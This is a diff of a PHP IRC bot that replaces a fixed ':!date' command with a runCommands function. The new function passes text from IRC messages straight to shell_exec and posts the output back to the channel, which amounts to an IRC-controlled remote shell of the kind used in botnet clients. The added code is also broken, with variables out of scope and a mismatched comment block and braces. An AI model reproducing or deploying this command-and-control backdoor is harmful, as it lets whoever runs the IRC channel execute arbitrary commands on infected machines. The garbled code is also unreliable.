@@ -53,7 +53,7 @@ function pongPings() {
 			fputs($socket, "PONG".$ex[1]."\n");
 		
 }
-
+/*
 function runCommands() {
 	// Add few less trivial Commands.
 	// Add functions for OS detection etc. Look at stuff in parts folder.
@@ -61,7 +61,17 @@ function runCommands() {
 		if ($command == ":!date") {
 			$cmdd = "date";
 			$output = exec($cmdd);
-			fputs($socket, "PRIVMSG ".$ex[2]." $output\n");
+			fputs($socket, "PRIVMSG ".$ex[2]."$output\n"); */
+function runCommands(String $command) {
+	
+	$command = str_replace(array(chr(10), chr(13)), '', $ex[3]);
+	
+			$cmdd = $command;
+			$output = shell_exec($cmdd);
+			fputs($socket, "PRIVMSG ".$ex[2]."$output\n"); 
+}
+// Make function take parameters 
+
 
 }
 
